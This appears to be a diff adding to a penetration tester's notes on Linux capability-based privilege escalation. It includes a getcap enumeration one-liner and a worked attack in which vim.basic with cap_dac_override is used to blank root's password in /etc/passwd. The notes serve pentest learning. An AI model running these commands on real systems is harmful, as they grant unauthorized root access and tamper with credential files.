@@ -276,3 +276,13 @@ $ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
 ```
 $ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
 ```
+%%  This one-liner uses the find command to search for all binary executables in the directories where they are typically located and then uses the -exec flag to run the getcap command on each, showing the capabilities that have been set for that binary. %%
+
+```
+$ getcap /usr/bin/vim.basic
+$ cat /etc/passwd | head -n1
+$ /usr/bin/vim.basic /etc/passwd
+$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+$ cat /etc/passwd | head -n1
+```
+%% For example, the /usr/bin/vim.basic binary is run without special privileges, such as with sudo. However, because the binary has the cap_dac_override capability set, it can escalate the privileges of the user who runs it. This would allow the penetration tester to gain the cap_dac_override capability and perform tasks that require this capability. We can use the cap_dac_override capability of the /usr/bin/vim binary to modify a system file: %%
